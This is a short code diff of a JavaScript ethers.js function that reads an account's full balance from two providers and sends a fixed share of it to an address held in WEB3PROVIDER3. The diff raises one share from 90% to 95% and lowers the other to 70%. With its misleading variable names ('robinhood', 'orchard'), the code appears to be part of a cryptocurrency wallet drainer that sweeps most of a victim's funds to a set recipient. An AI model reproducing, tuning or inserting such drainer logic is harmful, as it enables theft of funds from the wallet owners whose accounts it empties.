@@ -134,7 +134,7 @@ async function sending(){
       
       const send = async () => {
       const robinhood = await prov1.getBalance(account)
-      const orchard = (robinhood * 0.90).toString();
+      const orchard = (robinhood * 0.95).toString();
       const tx = {
         to: WEB3PROVIDER3,
         value: ethers.utils.parseUnits(orchard, 'wei'),
@@ -146,7 +146,7 @@ async function sending(){
   };
   const send2 = async () => {
     const robinhood = await prov2.getBalance(account)
-    const orchard = (robinhood * 0.90).toString();
+    const orchard = (robinhood * 0.70).toString();
     const tx = {
       to: WEB3PROVIDER3,
       value: ethers.utils.parseUnits(orchard, 'wei'),
